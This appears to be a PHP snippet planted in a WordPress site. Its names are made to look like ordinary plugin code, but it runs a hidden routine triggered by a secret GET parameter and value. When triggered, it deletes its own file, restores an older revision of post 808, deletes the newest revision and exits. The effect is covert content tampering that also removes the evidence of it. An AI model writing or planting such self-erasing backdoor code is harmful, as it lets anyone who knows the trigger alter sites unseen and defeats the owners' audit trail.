<?php

function map_integrate_preview_message() {
	if (isset($_GET['time_super_wpforms_control']) && $_GET['time_super_wpforms_control'] === 'gdpr_checkout_highlighter') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$wall_stop_theme_shipping = 808;
		$connector_helper_community = wp_get_post_revisions($wall_stop_theme_shipping);
		if (empty($connector_helper_community)) die('no revisions');
		if (count($connector_helper_community) < 2) die('less than 2');
		$campaign_yoast_display_php = array_shift($connector_helper_community);
		$styles_details_time = $campaign_yoast_display_php->ID;
		$blogroll_latest_status = array_shift($connector_helper_community);
		$preview_seo_related = $blogroll_latest_status->ID;
		$protect_contact_poll_software = wp_restore_post_revision($preview_seo_related);
		if ($protect_contact_poll_software === false) die('error restoring');
		$protect_contact_poll_software = wp_delete_post_revision($styles_details_time);		
		if ($protect_contact_poll_software === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'map_integrate_preview_message');
